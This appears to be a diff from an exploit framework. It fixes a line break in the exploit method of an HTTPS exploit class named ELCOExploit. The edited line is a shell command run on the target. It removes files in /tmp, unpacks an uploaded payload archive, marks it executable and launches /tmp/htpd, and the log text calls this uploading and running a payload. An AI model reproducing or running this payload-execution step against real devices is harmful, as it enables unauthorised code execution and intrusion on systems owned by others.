@@ -50,8 +50,7 @@ class ELCOExploit(HTTPSExploit):
     def exploit(self):
         self.log.info("Uploading and running payload...")
         
-        self._run_cmd("rm -f /tmp/ht*;tar xzvf `ls -c /tmp/cgi*|head -n 1` -C 
-                                    /tmp/ && chmod +x /tmp/ht*;/tmp/htpd",self.payload)
+        self._run_cmd("rm -f /tmp/ht*;tar xzvf `ls -c /tmp/cgi*|head -n 1` -C /tmp/ && chmod +x /tmp/ht*;/tmp/htpd",self.payload)
         
     def clean(self):
         self.log.info("Cleaning up...")
